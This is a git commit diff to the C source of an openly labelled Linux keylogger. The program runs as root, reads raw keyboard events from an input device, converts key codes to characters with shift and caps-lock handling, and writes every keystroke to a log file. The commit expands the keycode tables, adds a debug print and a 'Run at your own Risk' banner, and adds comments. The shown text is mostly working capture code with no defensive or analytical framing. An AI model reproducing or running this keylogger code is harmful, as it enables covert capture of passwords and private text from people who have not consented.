9a402286434005103b25698cb45e0b45fb06f51e
Shishir Jindal <honey.jindal5@gmail.com>
2017-05-14 21:33:20 +0530

    Bugs fixed.

--- main.c
+++ main.c
@@ -11,8 +11,8 @@
 #define ROOTID 0
 
 // arrays for keys(for both small and capital chars including chars like !@#$%^&*())
-static char *keys_upper[] = {"<RESERVED>", "<ESC>", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "<BACKSPACE>", "	", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "[", "]", "\n", "<LEFTCTRL>", "A", "S", "D", "F", "G", "H", "J", "K", "L", ";", "'", "`", "<LEFTSHIFT>", "\\", "Z", "X", "C", "V", "B", "N", "M", ",", ".", "/", "<RIGHTSHIFT>", "*", "<LEFTALT>", " ", "<CAPSLOCK>", "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>", "<NUMLOCK>", "<SCROLLLOCK>", "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3", "0", ".", "" ,"<ZENKAKUHANKAKU>", "102ND", "<F11>", "<F12>", "<RO>", "<KATAKANA>", "<HIRAGANA>", "<HENKAN>", "<KATAKANAHIRAGANA>", "<MUHENKAN>", "<JPCOMMA>", "\n", "<RIGHTCTRL>", "/", "<SYSRQ>", "<RIGHTALT>", "<LINEFEED>", "<HOME>", "<UP>", "<PAGEUP>", "<LEFT>", "<RIGHT>", "<END>", "<DOWN>", "<PAGEDOWN>", "<INSERT>", "<DELETE>", "<MACRO>", "<MUTE>", "<VOLUMEDOWN>", "<VOLUMEUP>", "<POWER>"};
-static char *keys_lower[] = {"<reserved>", "<esc>", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "<backspace>", "	", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "\n", "<leftctrl>", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "<leftshift>", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "<rightshift>", "*", "<leftalt>", " ", "<capslock>", "<f1>", "<f2>", "<f3>", "<f4>", "<f5>", "<f6>", "<f7>", "<f8>", "<f9>", "<f10>", "<numlock>", "<scrolllock>", "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3", "0", ".", "" ,"<zenkakuhankaku>", "102nd", "<f11>", "<f12>", "<ro>", "<katakana>", "<hiragana>", "<henkan>", "<katakanahiragana>", "<muhenkan>", "<jpcomma>", "\n", "<rightctrl>", "/", "<sysrq>", "<rightalt>", "<linefeed>", "<home>", "<up>", "<pageup>", "<left>", "<right>", "<end>", "<down>", "<pagedown>", "<insert>", "<delete>", "<macro>", "<mute>", "<volumedown>", "<volumeup>", "<power>"};
+static char *keys_upper[] = {"<RESERVED>", "<ESC>", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "<BACKSPACE>", "	", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "[", "]", "\n", "<LEFTCTRL>", "A", "S", "D", "F", "G", "H", "J", "K", "L", ";", "'", "`", "<LEFTSHIFT>", "\\", "Z", "X", "C", "V", "B", "N", "M", ",", ".", "/", "<RIGHTSHIFT>", "*", "<LEFTALT>", " ", "<CAPSLOCK>", "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>", "<NUMLOCK>", "<SCROLLLOCK>", "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3", "0", ".", "" ,"<ZENKAKUHANKAKU>", "102ND", "<F11>", "<F12>", "<RO>", "<KATAKANA>", "<HIRAGANA>", "<HENKAN>", "<KATAKANAHIRAGANA>", "<MUHENKAN>", "<JPCOMMA>", "\n", "<RIGHTCTRL>", "/", "<SYSRQ>", "<RIGHTALT>", "<LINEFEED>", "<HOME>", "<UP>", "<PAGEUP>", "<LEFT>", "<RIGHT>", "<END>", "<DOWN>", "<PAGEDOWN>", "<INSERT>", "<DELETE>", "<MACRO>", "<MUTE>", "<VOLUMEDOWN>", "<VOLUMEUP>", "<POWER>", "<KPEQUAL>", "<KPPLUSMINUS>", "<PAUSE>", "<SCALE>", "<KPCOMMA>", "<HANGEUL>", "<HANJA>", "<YEN>", "<LEFTMETA>", "<RIGHTMETA>", "<COMPOSE>"};
+static char *keys_lower[] = {"<reserved>", "<esc>", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "<backspace>", "	", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "\n", "<leftctrl>", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "<leftshift>", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "<rightshift>", "*", "<leftalt>", " ", "<capslock>", "<f1>", "<f2>", "<f3>", "<f4>", "<f5>", "<f6>", "<f7>", "<f8>", "<f9>", "<f10>", "<numlock>", "<scrolllock>", "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3", "0", ".", "" ,"<zenkakuhankaku>", "102nd", "<f11>", "<f12>", "<ro>", "<katakana>", "<hiragana>", "<henkan>", "<katakanahiragana>", "<muhenkan>", "<jpcomma>", "\n", "<rightctrl>", "/", "<sysrq>", "<rightalt>", "<linefeed>", "<home>", "<up>", "<pageup>", "<left>", "<right>", "<end>", "<down>", "<pagedown>", "<insert>", "<delete>", "<macro>", "<mute>", "<volumedown>", "<volumeup>", "<power>", "<kpequal>", "<kpplusminus>", "<pause>", "<scale>", "<kpcomma>", "<hangeul>", "<hanja>", "<yen>", "<leftmeta>", "<rightmeta>", "<compose>"};
 static char *special_chars[2][20] = {{"`", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "[", "]", ";", "'", ",", ".", "/"},{"~", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "{", "}", ":", "\"", "<", ">", "?"}};
 
 // checking for shift key
@@ -31,7 +31,7 @@ static int isCapsOn(int eventcode){
 	return 0;
 }
 
-// check for chars like !@#$%^&*()_
+// check for chars like !@#$%^&*()_{}:"<>?
 static char *checkKey(char *key){
 	for(int i=0; i<20; i++){
 		if(special_chars[0][i] == key){
@@ -43,6 +43,7 @@ static char *checkKey(char *key){
 
 // convert event code to corresponding char
 static char *pressedKey(int eventcode, int shift, int caps){
+	printf("%d\n", eventcode);
 	if(shift^caps){
 		char *key = keys_upper[eventcode];
 		if(shift == 1){
@@ -60,10 +61,11 @@ int main(){
 	typedef struct input_event input_event;
 	input_event event;
 	int shift = 0;
-	int caps = 0;
+	int caps = 0;					// assuming caps to be off
 
 	// banner
 	printf("############ Keylogger Started #############\n");
+	printf("########### Run at your own Risk ###########\n");
 
 	// root check
 	if(geteuid() != ROOTID){
@@ -96,13 +98,13 @@ int main(){
 	// capturing keystrokes
 	while(1){
 		if(read(fp, &event, sizeof(input_event))>0){
-			if(event.type == EV_KEY){
+			if(event.type == EV_KEY){					// checking event type to be of keyboard
 				if(event.value == KEY_PRESS){
 					if(isShiftPressed(event.code)){
 						shift = 1;
 					}
 					if(isCapsOn(event.code)){
-						caps = caps^1;
+						caps = caps^1;					// switching caps value on every keypress
 					}
 					char *key = pressedKey(event.code, shift, caps);
 					fputs(key, lf);
